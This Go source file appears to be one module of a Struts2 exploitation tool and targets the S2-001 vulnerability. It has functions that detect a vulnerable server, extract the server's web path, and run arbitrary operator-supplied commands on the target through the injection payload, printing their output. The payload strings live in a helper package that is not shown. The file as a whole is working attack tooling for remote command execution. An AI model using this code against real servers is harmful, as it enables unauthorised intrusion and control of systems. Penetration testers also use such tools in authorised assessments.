package s001

import (
	"ST2G/cvemod/utils"
	"fmt"
	"log"
	"net/url"
	"strings"
)

func Check(targetUrl string, postData string) {
	respStrings := utils.PostFunc4Struts2(targetUrl, postData, "", utils.PocS001Check)
	if utils.IfContainsStr(respStrings, "6308") {
		log.Printf("%v %v", utils.Green(targetUrl), utils.Red("*Found Struts2-001！"))
	} else {
		log.Printf("%s Struts2-001 Not Vulnerable.", utils.Green(targetUrl))
	}
}

func GetWebPath(targetUrl string, postData string) {
	respStrings := utils.PostFunc4Struts2(targetUrl, postData, "", utils.PocS001WebPath)
	webPath := utils.GetBetweenStr(respStrings, "s001webpathstart", "s001webpathend")[16:]
	log.Println(utils.Green(webPath))
}

func ExecCommand(targetURL string, command string, postData string) {
	respStrings := utils.PostFunc4Struts2(targetURL, postData, "", utils.PocS001Exec(command))
	//下面步骤清洗数据，主要是去掉空字符，输出块大小可以在poc中调节
	respStrings = strings.Replace(url.QueryEscape(respStrings), "%00", "", -1)
	execResult := utils.GetBetweenStr(respStrings, "s001execstart", "s001execend")
	fmt.Println(url.QueryUnescape(execResult))
}
